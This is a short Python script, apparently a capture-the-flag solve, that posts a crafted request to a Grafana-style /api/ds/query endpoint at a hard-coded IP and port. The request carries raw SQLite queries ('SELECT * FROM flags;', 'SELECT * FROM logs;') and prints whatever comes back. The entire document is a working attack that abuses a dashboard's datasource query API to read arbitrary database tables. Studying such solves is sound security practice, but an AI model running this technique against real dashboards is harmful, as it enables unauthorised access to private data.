import requests
resp = requests.post(
	"http://193.57.159.27:25776/api/ds/query",
	json={
	"queries":
	[
	{
	"queryText": "SELECT * FROM flags;",
	"queryType": "table",
	"rawQueryText": "SELECT * FROM logs;",
	"refId": "A",
	"timeColumns": [],
	"datasource": "sqlite",
	"datasourceId": 1,
	"intervalMs": 30000,
	"maxDataPoints": 683
	}
	],
	"range":
	{
	"from": "2021-08-13T21:47:21.817Z",
	"to": "2021-08-14T03:47:21.817Z",
	"raw": {
	"from": "now-6h",
	"to": "now"
	}
	},
	"from": "1628891241817",
	"to": "1628912841817"
	}
)

print(resp.json())